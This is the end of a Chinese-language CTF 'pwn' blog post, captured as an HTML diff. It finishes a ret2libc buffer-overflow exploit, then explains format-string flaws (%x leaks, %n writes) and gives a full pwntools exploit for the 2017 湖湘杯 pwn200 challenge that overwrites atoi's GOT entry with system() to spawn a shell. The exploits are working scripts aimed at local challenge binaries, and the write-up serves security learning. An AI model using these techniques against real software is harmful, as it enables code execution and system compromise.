+<span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>
+<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###sending payload1 ...###&#34;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###receving write() addr...###&#34;</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="nb">print</span> <span class="s1">&#39;write_addr=&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###calculating system() addr and </span><span class="se">\&#34;</span><span class="s2">/bin/sh</span><span class="se">\&#34;</span><span class="s2"> addr...###&#34;</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+<span class="nb">print</span> <span class="s1">&#39;system_addr= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)))</span>
+<span class="nb">print</span> <span class="s1">&#39;binsh_addr= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###sending payload2 ...###&#34;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>效果如下：
+<img src="/img/pwn/22.jpg" alt="figure"></p>
+<h4 id="0x03格式化字符串漏洞">0x03格式化字符串漏洞<a href="#0x03格式化字符串漏洞" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>文件：pwne (2017湖湘杯pwn200赛题)
+保护：ASLR NX
+printf函数的格式化字符串常见的有 %d，%f，%c，%s（用于读取内存数据），%x（输出16进制数，前面没有0x），%p或%#x（输出16进制数，前面带有0x）；%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，用于修改内存，除了%n,还有%hn，%hhn，%lln，分别为写入目标空间4字节，2字节，1字节，8字节。</p>
+<p>综上，格式化字符可以分为两类：读取数据格式符和写入数据格式符。</p>
+<p>这里说一下，不是所有C编译器都支持%n, 我在windows上的codeblocks配的是C99标准的gcc编译器，执行无法靠%n写入数据，在这里我也有点迷惑，出题的人到底是用的什么编译器。。</p>
+<p>既然本地不一定能做到，那就用现成的题目文件吧。</p>
+<p>下面我们用这个文件看一下利用格式化字符串漏洞读取数据的方法：
+<img src="/img/pwn/23.jpg" alt="figure">
+我们看到，第七个%x取值是0x41414141, 也就是AAAA的ascii码，造成内存泄漏了。
+解释：该文件GET YOUR NAME:后， 执行的是printf(str)。
+也就是说，它把我们的输入当格式化字符串执行了。
+我们%x取的其实是寄存器中的内容，寄存器里面又存什么呢？
+是printf除格式化字符串外的参数，但是这里没有输入参数，也就是说，寄存器的内容其实是垃圾值。</p>
+<p>那又为什么在第七个%x取值位置输出了AAAA呢？
+因为调用printf后，首先再把格式化字符串压栈，再把参数地址存进寄存器和栈中，再把所有能用的寄存器压栈，最后存进了个格式化字符串指针（用来指向格式化字符串地址，检索格式符），我这个ubuntu linux内寄存器地址加空白地址一共六个四字节空间，第七个取到的就是格式化字符串中的AAAA了。
+栈图(网上找的)如下：
+<img src="/img/pwn/23.png" alt="figure">
+墨绿是寄存器地址，蓝色是空白位或者额外的存储参数空间，绿色是格式化字符串内容，橙色是格式化字符串指针。</p>
+<p>夸张的是，%x能泄露栈上高地址位的内容，%n的修改内存的功能，能将更改任意函数的调用。这两者结合简直无法无天。</p>
+<p>下面进入题目分析环节。。。：
+IDA pro分析：
+<img src="/img/pwn/24.jpg" alt="figure">
+这道题了里，我们先利用%$7x(取第7个四字节数)， 返回puts函数链接后的地址。然后用%n改变atoi的调用，使它的调用地址指向system的函数地址（用偏移量算）,输入的age没经过类型检查，直接换成&quot;/bin/sh&quot;, 大功告成。
+exp:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwne&#39;</span><span class="p">)</span>
+<span class="c1"># conn=remote(&#39;ip&#39;,port)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+<span class="c1">#libc=ELF(&#39;./libc.so.6&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwne&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[Y/N]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;NAME:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;WELCOME </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">puts_addr</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
+<span class="c1"># print u32(put_addr)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">u32</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">atoi_got_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;17&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[Y/N]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;NAME:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">atoi_got_addr</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">}))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;GET YOUR AGE:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>效果如下：
+<img src="/img/pwn/25.jpg" alt="figure"></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p>
+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://shankisme.com/tags/ctf">ctf</a></span><span class="tag"><a href="https://shankisme.com/tags/pwn">pwn</a></span>
+				</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>433 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-03-07 13:43 &#43;0000</p>
+			</footer>
+		</article>
+		<aside id="toc" class="show-toc">
+			<div class="toc-title">Table of Contents</div>
+			<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+		</aside>
+		<div class="to-top">
+			<i><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg></i>
+		</div>
+		<div class="post-nav thin">
+			<a class="next-post" href="https://shankisme.com/posts/kong%E7%BD%91%E5%85%B3consumer-service-route-plugin-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E8%B7%B5/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;Newer</span><br><span>kong网关consumer service route plugin 理解与实践</span>
+			</a>
+			<a class="prev-post" href="https://shankisme.com/posts/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>pwntools下踩的坑</span>
+			</a>
+		</div>
+		<div id="comments" class="thin"><script src="https://utteranc.es/client.js"
+        repo="playHing/blog"
+        issue-term="pathname"
+        crossorigin="anonymous"
+        async>
+</script></div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://shankisme.com">shank</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://shankisme.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://shankisme.com/js/bundle.min.a0bd26cee39afcbb1504c0ffa991736f16c2439e577a925a0a9a3d0650cef15c.js" integrity="sha256-oL0mzuOa/LsVBMD/qZFzbxbCQ55XepJaCpo9BlDO8Vw=" crossorigin="anonymous"></script>
+	
+	<script src="https://shankisme.com/js/theme-control.min.03a2a6e81dcb3d6cd8e354efdca3cff8a51eb0685d8805c580acb9e0de51efda.js" integrity="sha256-A6Km6B3LPWzY41Tv3KPP+KUesGhdiAXFgKy54N5R79o=" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
